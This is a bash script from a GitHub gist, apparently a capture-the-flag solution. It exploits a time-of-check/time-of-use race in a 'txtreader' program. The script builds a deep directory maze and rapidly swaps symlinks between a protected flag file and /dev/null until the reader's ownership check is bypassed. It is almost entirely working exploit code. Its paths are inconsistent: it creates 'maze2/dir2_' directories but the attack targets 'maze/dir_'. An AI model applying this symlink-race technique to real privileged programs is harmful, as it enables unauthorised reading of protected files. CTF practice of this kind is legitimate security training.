#date: 2023-03-17T17:10:04Z
#url: https://api.github.com/gists/6ddde25d9492d91dc7c8f78c74250fc6
#owner: https://api.github.com/users/dgagn

#!/bin/bash

# Create the maze
mkdir -p maze2
cd maze2

depth=100

for ((i=1; i<=$depth; i++)); do
  mkdir -p dir2_$i
  cd dir2_$i
done


for i in {1..5}; do
  ln -sf /home/ctf-player/flag.txt symlink2_$i.txt
done

cd /home/ctf-player

# Exploit
function switch_symlink2() {
  while true; do
    for i in {1..5}; do
      ln -sf /home/ctf-player/flag.txt maze/dir_$depth/symlink2_$i.txt
      ln -sf /dev/null maze/dir_$depth/symlink2_$i.txt
    done
  done
}

function run_txtreader2() {
  while true; do
    for i in {1..5}; do
      output=$(/home/ctf-player/txtreader maze/$(printf "dir_%s/" {1..100})symlink2_$i.txt 2>&1)
      if [[ ! $output =~ "Error: you don't own this file" && ! $output =~ "Error: Could not retrieve file information" ]]; then
        echo "$output"
        exit 0
      fi
    done
  done
}

switch_symlink2 &

run_txtreader2
